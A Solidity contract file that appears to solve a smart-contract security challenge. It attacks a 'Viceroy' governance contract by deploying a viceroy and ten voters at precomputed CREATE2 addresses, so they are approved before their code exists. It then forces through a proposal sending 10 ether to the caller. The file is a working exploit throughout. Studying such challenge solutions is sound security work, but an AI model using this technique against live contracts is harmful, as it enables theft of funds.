// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "../Viceroy.sol";

contract GovernanceAttacker {
    function attack(Governance governance) external {
        bytes memory proposal = abi.encodeWithSignature("exec(address,bytes,uint256)", msg.sender, "", 10 ether);
        uint256 proposalId = uint256(keccak256(proposal));

        bytes memory creationCode = type(Viceroy).creationCode;
        bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(governance, proposalId, proposal));
        bytes32 salt = bytes32(uint256(487)); // 487 is just a random number

        address viceroy = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
        );

        governance.appointViceroy(viceroy, 1);
        Viceroy _viceroy = new Viceroy{salt: salt}(governance, proposalId, proposal);

        assert(address(_viceroy) == viceroy);

        governance.deposeViceroy(viceroy, 1);

        governance.executeProposal(proposalId);
    }
}

contract Viceroy {
    constructor(Governance governance, uint256 proposalId, bytes memory proposal) {
        governance.createProposal(address(this), proposal);

        for (uint256 i = 1; i < 11; i++) {
            bytes memory creationCode = type(Voter).creationCode;
            bytes memory bytecode = abi.encodePacked(creationCode, abi.encode(governance, proposalId));
            bytes32 salt = bytes32(i);

            address voter = address(
                uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)))))
            );

            governance.approveVoter(voter);
            new Voter{salt: salt}(governance, proposalId);
            governance.disapproveVoter(voter);
        }
    }
}

contract Voter {
    constructor(Governance governance, uint256 proposalId) {
        bool inFavor = true;
        address viceroy = msg.sender;
        governance.voteOnProposal(proposalId, inFavor, viceroy);
    }
}
